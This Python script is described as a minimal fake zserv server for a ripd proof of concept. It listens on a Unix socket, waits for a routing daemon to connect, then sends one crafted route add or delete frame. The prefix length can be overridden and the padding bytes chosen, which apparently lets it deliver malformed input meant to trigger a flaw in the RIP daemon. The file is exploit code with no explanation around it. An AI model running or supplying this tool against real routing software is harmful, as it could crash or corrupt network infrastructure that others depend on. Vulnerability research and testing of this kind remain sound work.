#!/usr/bin/env python3
import argparse
import ipaddress
import math
import os
import socket
import struct
import time


def build_frame(command: int, route_type: int, prefix: str, plen_override: int | None, fill_byte: int, message: int = 0) -> bytes:
    net = ipaddress.ip_network(prefix, strict=False)
    plen = plen_override if plen_override is not None else net.prefixlen
    prefix_len = math.ceil(plen / 8)

    if plen_override is None and plen <= 32:
        raw = bytearray(net.network_address.packed[:prefix_len])
        if len(raw) < prefix_len:
            raw.extend(bytes([fill_byte & 0xFF]) * (prefix_len - len(raw)))
        prefix_bytes = bytes(raw)
    else:
        prefix_bytes = bytes([fill_byte & 0xFF]) * prefix_len

    body = bytes([route_type & 0xFF, 0x00, message & 0xFF, plen & 0xFF]) + prefix_bytes
    return struct.pack(">HB", len(body) + 3, command & 0xFF) + body


def recv_one(conn: socket.socket) -> bytes | None:
    hdr = conn.recv(3)
    if not hdr:
        return None
    if len(hdr) != 3:
        raise RuntimeError(f"incomplete zserv header: {hdr!r}")

    total_len = struct.unpack(">H", hdr[:2])[0]
    if total_len < 3:
        raise RuntimeError(f"invalid zserv total length: {total_len}")

    remaining = total_len - 3
    body = b""
    while len(body) < remaining:
        chunk = conn.recv(remaining - len(body))
        if not chunk:
            raise RuntimeError("unexpected EOF while reading zserv body")
        body += chunk
    return hdr + body


def main() -> int:
    ap = argparse.ArgumentParser(description="Minimal fake zserv server for ripd PoC")
    ap.add_argument("--socket", default="/tmp/.zserv")
    ap.add_argument("--command", type=int, default=7, choices=[7, 8], help="7=IPv4 route add, 8=delete")
    ap.add_argument("--route-type", type=int, default=1)
    ap.add_argument("--prefix", default="10.0.0.0/24")
    ap.add_argument("--plen", type=int, default=None, help="raw prefix length override")
    ap.add_argument("--fill-byte", type=lambda s: int(s, 0), default=0x41)
    ap.add_argument("--linger", type=float, default=2.0, help="seconds to keep connection open after send")
    args = ap.parse_args()

    sock_path = args.socket
    os.makedirs(os.path.dirname(sock_path), exist_ok=True)
    try:
        os.unlink(sock_path)
    except FileNotFoundError:
        pass

    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(sock_path)
    srv.listen(1)
    print(f"[fake-zserv] listening on {sock_path}", flush=True)

    conn, _ = srv.accept()
    print("[fake-zserv] client connected", flush=True)
    conn.settimeout(0.5)

    idle_rounds = 0
    while idle_rounds < 4:
        try:
            frame = recv_one(conn)
        except socket.timeout:
            idle_rounds += 1
            continue

        if frame is None:
            print("[fake-zserv] client closed before payload send", flush=True)
            return 1

        idle_rounds = 0
        print(f"[fake-zserv] recv {frame.hex()}", flush=True)

    frame = build_frame(args.command, args.route_type, args.prefix, args.plen, args.fill_byte)
    print(f"[fake-zserv] send {frame.hex()}", flush=True)
    conn.sendall(frame)
    time.sleep(args.linger)
    conn.close()
    srv.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
